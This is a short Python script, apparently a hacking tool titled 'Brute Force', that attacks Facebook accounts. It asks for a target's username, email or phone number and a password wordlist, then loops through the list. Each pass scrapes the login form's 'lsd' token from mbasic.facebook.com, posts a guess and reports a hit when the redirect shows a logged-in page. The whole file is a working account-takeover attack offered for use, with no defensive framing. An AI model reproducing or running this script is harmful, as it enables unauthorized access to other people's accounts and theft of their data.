import requests
import sys
from bs4 import BeautifulSoup
import os

os.system("clear")

print("""

\033[33m  ____             _         ______                  
 |  _ \           | |       |  ____|                 
 | |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___  
 |  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \ 
 | |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/ 
 |____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___| 
\033[0m

\033[31m Author : Siam Islam Saim\033[0m

\033[33m Team   : https://www.facebook.com/profile.php?id=61575879792048 \033[0m                                                                                                          
                                                     
""")

def fb_brute_BLACK_ZERO():

    email = input("Enter Facebook username/email/phone > ")
    wordlist = input("Enter path to wordlist file > ")
    url = "https://mbasic.facebook.com/login.php"

    try:
        with open(wordlist, "r", encoding="utf-8") as f:
            for password in f:
                password = password.strip()
                session = requests.Session()
                r = session.get(url)
                soup = BeautifulSoup(r.text, "html.parser")
                lsd = soup.find("input", {"name": "lsd"}).get("value")

                data = {
                    "lsd": lsd,
                    "email": email,
                    "pass": password,
                    "login": "Log In"
                }
                res = session.post(url, data=data)
                if "save-device" in res.url or "home.php" in res.url:
                    print(f"✅ Password found: {password}")
                    break
                else:
                    print(f"❌ Failed: {password}")
    except Exception as e:
        print(f"[bold red]Error: {e}")
    input("\n\033[96m Press Enter to return...")


fb_brute_BLACK_ZERO()